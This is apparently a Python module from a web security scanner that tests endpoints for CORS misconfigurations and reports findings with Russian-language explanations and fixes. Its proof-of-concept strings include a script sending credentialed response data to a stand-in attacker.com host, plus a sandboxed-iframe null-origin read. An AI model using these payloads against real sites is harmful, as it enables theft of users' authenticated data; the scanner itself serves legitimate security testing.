from __future__ import annotations
import requests
from ..findings import Finding, Severity
from ..session import session_to_curl_flags


ORIGIN_PROBES = [
    ("https://evil.example.com", "arbitrary external origin"),
    ("null", "null origin"),
    ("https://trusted-domain.evil.com", "subdomain of trusted (if reflected by prefix)"),
]


def run(session: requests.Session, base_url: str, endpoints: list, store) -> None:
    print("[*] Checking CORS configuration...")
    curl_auth = session_to_curl_flags(session)
    timeout = getattr(session, 'timeout', 15)

    # Test main endpoints + unique paths
    tested_paths: set[str] = set()
    targets = [base_url] + [ep.url for ep in endpoints if ep.method == "GET"]

    for url in targets:
        if url in tested_paths:
            continue
        tested_paths.add(url)
        _test_cors(session, url, curl_auth, timeout, store)


def _test_cors(session, url, curl_auth, timeout, store):
    for origin, label in ORIGIN_PROBES:
        try:
            resp = session.get(
                url,
                headers={"Origin": origin},
                timeout=timeout,
            )
        except Exception:
            continue

        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        acam = resp.headers.get("Access-Control-Allow-Methods", "")
        acah = resp.headers.get("Access-Control-Allow-Headers", "")

        if not acao:
            continue

        if acao == "*" and acac == "true":
            store.add(Finding(
                title="CORS: критическая — wildcard с Allow-Credentials",
                severity=Severity.CRITICAL,
                category="CORS",
                cwe="CWE-942",
                description=(
                    "Сервер возвращает одновременно Access-Control-Allow-Origin: * "
                    "и Access-Control-Allow-Credentials: true. "
                    "По спецификации это не должно работать, но некоторые браузеры/прокси нарушают стандарт."
                ),
                url=url,
                evidence=f"ACAO: {acao}\nACAC: {acac}",
                remediation=(
                    "Никогда не используйте * с credentials. "
                    "Разрешайте только конкретные домены из белого списка."
                ),
                reproduction=(
                    f"curl -sk {curl_auth} -H 'Origin: {origin}' "
                    f"-I '{url}' | grep -i access-control"
                ),
            ))

        elif acao == "*":
            store.add(Finding(
                title=f"CORS: wildcard Access-Control-Allow-Origin ({label})",
                severity=Severity.LOW,
                category="CORS",
                cwe="CWE-942",
                description=(
                    "Сервер возвращает Access-Control-Allow-Origin: *. "
                    "Любой сайт может читать ответ через XMLHttpRequest/fetch. "
                    "Критично для API с чувствительными данными."
                ),
                url=url,
                evidence=f"ACAO: {acao}",
                remediation="Ограничьте CORS конкретными доменами. Уберите * для authenticated endpoints.",
                reproduction=(
                    f"curl -sk {curl_auth} -H 'Origin: {origin}' "
                    f"-I '{url}' | grep -i access-control"
                ),
            ))

        elif origin in acao and acac == "true":
            store.add(Finding(
                title=f"CORS: отражение Origin с Allow-Credentials — {label}",
                severity=Severity.HIGH,
                category="CORS",
                cwe="CWE-942",
                description=(
                    f"Сервер отражает Origin '{origin}' в ACAO "
                    f"и устанавливает Allow-Credentials: true.\n"
                    "Атакующий может совершать аутентифицированные cross-origin запросы от имени жертвы.\n\n"
                    "PoC:\n"
                    "```html\n"
                    "<script>\n"
                    f"fetch('{url}', {{credentials: 'include'}})\n"
                    "  .then(r => r.text())\n"
                    "  .then(d => fetch('https://attacker.com/?leak='+btoa(d)))\n"
                    "</script>\n"
                    "```"
                ),
                url=url,
                evidence=(
                    f"Request Origin: {origin}\n"
                    f"ACAO: {acao}\n"
                    f"ACAC: {acac}\n"
                    f"ACAM: {acam}"
                ),
                remediation=(
                    "1. Проверяйте Origin по жёсткому белому списку (не по prefix/suffix).\n"
                    "2. Не используйте динамическое отражение Origin.\n"
                    "3. Если API публичное — уберите Allow-Credentials."
                ),
                reproduction=(
                    f"# Step 1: убедиться что Origin отражается:\n"
                    f"curl -sk {curl_auth} -H 'Origin: {origin}' -I '{url}'\n\n"
                    f"# Step 2: PoC HTML (разместить на подконтрольном домене):\n"
                    f"cat > /tmp/cors_poc.html << 'EOF'\n"
                    f"<script>\n"
                    f"fetch('{url}', {{credentials:'include'}})\n"
                    f"  .then(r=>r.text()).then(d=>console.log(d));\n"
                    f"</script>\n"
                    f"EOF\n"
                    f"python3 -m http.server 8888 --directory /tmp"
                ),
            ))

        elif origin in acao:
            store.add(Finding(
                title=f"CORS: отражение произвольного Origin — {label}",
                severity=Severity.MEDIUM,
                category="CORS",
                cwe="CWE-942",
                description=(
                    f"Сервер отражает Origin '{origin}' в ACAO без ограничений.\n"
                    "Без Allow-Credentials данные доступны только публичные, "
                    "но это может стать проблемой при утечке токенов в URL или ответах."
                ),
                url=url,
                evidence=f"Request Origin: {origin}\nACАO: {acao}",
                remediation="Используйте белый список Origins вместо динамического отражения.",
                reproduction=(
                    f"curl -sk {curl_auth} -H 'Origin: {origin}' -I '{url}'"
                ),
            ))

        elif origin == "null" and "null" in acao:
            store.add(Finding(
                title="CORS: разрешён null Origin",
                severity=Severity.HIGH,
                category="CORS",
                cwe="CWE-942",
                description=(
                    "Сервер принимает Origin: null. null origin получают: file://, "
                    "data: URI, sandboxed iframes — атакующий может запустить XHR из таких контекстов."
                ),
                url=url,
                evidence=f"ACAO: {acao}",
                remediation="Удалите 'null' из списка разрешённых Origins.",
                reproduction=(
                    f"# PoC: HTML-файл с sandboxed iframe (даёт Origin: null)\n"
                    f"cat > /tmp/null_cors.html << 'EOF'\n"
                    f"<iframe sandbox=\"allow-scripts\" src=\"data:text/html,"
                    f"<script>fetch('{url}',{{credentials:'include'}})"
                    f".then(r=>r.text()).then(d=>console.log(d))</script>\"></iframe>\n"
                    f"EOF\n"
                    f"python3 -m http.server 8888 --directory /tmp"
                ),
            ))
